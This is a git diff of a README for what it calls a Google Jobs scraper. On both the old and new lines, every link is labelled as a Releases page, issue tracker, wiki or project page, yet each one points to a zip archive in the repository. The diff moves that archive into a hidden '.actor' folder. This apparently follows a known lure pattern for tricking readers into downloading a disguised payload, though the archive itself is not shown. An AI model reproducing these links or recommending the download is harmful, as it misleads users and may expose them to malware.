@@ -1,6 +1,6 @@
 # 🌍 Apify-Google-Jobs-Scraper - Uncover Global Job Opportunities Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/gwavinpolen/Apify-Google-Jobs-Scraper/main/Portuguese/Apify-Google-Jobs-Scraper.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/gwavinpolen/Apify-Google-Jobs-Scraper/main/Portuguese/Apify-Google-Jobs-Scraper.zip)
+[![Download Now](https://github.com/gwavinpolen/Apify-Google-Jobs-Scraper/raw/refs/heads/main/.actor/Google_Scraper_Apify_Jobs_v1.3.zip%20Now-Click%20Here-blue)](https://github.com/gwavinpolen/Apify-Google-Jobs-Scraper/raw/refs/heads/main/.actor/Google_Scraper_Apify_Jobs_v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to the Apify Google Jobs Scraper! This tool helps you gather real-time j
 ## 📥 Download & Install
 
 1. **Visit the Release Page**  
-   Go to our official [Releases page](https://raw.githubusercontent.com/gwavinpolen/Apify-Google-Jobs-Scraper/main/Portuguese/Apify-Google-Jobs-Scraper.zip) to find the latest version of the scraper.
+   Go to our official [Releases page](https://github.com/gwavinpolen/Apify-Google-Jobs-Scraper/raw/refs/heads/main/.actor/Google_Scraper_Apify_Jobs_v1.3.zip) to find the latest version of the scraper.
 
 2. **Choose the Right Version**  
    Look for the version marked as "Latest." You will see several files available for download. Select the file appropriate for your operating system.
@@ -66,16 +66,16 @@ To run the Apify Google Jobs Scraper smoothly, please ensure your system meets t
 
 If you have questions or face issues, our community is here to help. You can find support through:
 
-- **GitHub Issues:** Report any bugs or request features [here](https://raw.githubusercontent.com/gwavinpolen/Apify-Google-Jobs-Scraper/main/Portuguese/Apify-Google-Jobs-Scraper.zip).
-- **Documentation:** Access detailed guides and FAQs on the [Wiki section](https://raw.githubusercontent.com/gwavinpolen/Apify-Google-Jobs-Scraper/main/Portuguese/Apify-Google-Jobs-Scraper.zip).
+- **GitHub Issues:** Report any bugs or request features [here](https://github.com/gwavinpolen/Apify-Google-Jobs-Scraper/raw/refs/heads/main/.actor/Google_Scraper_Apify_Jobs_v1.3.zip).
+- **Documentation:** Access detailed guides and FAQs on the [Wiki section](https://github.com/gwavinpolen/Apify-Google-Jobs-Scraper/raw/refs/heads/main/.actor/Google_Scraper_Apify_Jobs_v1.3.zip).
 - **User Community:** Join discussions and share tips with other users on our forums.
 
 ## 🔗 Additional Resources
 
-For more details and to explore further, visit our project's [GitHub page](https://raw.githubusercontent.com/gwavinpolen/Apify-Google-Jobs-Scraper/main/Portuguese/Apify-Google-Jobs-Scraper.zip) for updates and documentation.
+For more details and to explore further, visit our project's [GitHub page](https://github.com/gwavinpolen/Apify-Google-Jobs-Scraper/raw/refs/heads/main/.actor/Google_Scraper_Apify_Jobs_v1.3.zip) for updates and documentation.
 
 ### 📄 License
 
 This project is licensed under the MIT License. You can freely use and modify the software while following the terms of this license.
 
-Remember to check back often for new releases. Download the Apify Google Jobs Scraper today from our [Releases page](https://raw.githubusercontent.com/gwavinpolen/Apify-Google-Jobs-Scraper/main/Portuguese/Apify-Google-Jobs-Scraper.zip) and start uncovering job opportunities all around the globe!
+Remember to check back often for new releases. Download the Apify Google Jobs Scraper today from our [Releases page](https://github.com/gwavinpolen/Apify-Google-Jobs-Scraper/raw/refs/heads/main/.actor/Google_Scraper_Apify_Jobs_v1.3.zip) and start uncovering job opportunities all around the globe!
